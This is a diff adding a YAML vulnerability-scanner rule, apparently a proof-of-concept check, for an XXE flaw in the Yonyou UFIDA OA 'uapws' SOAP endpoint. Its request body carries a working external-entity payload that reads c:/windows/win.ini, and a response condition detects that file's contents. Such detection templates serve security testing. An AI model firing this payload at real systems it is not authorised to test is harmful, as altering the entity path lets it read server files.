@@ -1,0 +1,17 @@
+name: yongyou-ufida-oa-uapws-xxe
+rules:
+  - method: POST
+    path: "/uapws/soapFormat.ajax"
+    body: |
+      msg=<!DOCTYPE foo[<!ENTITY xxe1two SYSTEM "file:///c:/windows/win.ini"> ]>
+      <soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+      <soap:Body>
+      <soap:Fault>
+      <faultcode>soap:Server%26xxe1two%3b</faultcode>
+      </soap:Fault>
+      </soap:Body>
+      </soap:Envelope>%0a
+    expression: |
+      response.status == 200 && (response.body.bcontains(b"for 16-bit app support") || response.body.bcontains(b"[extensions]"))
+detail:
+  author: 666
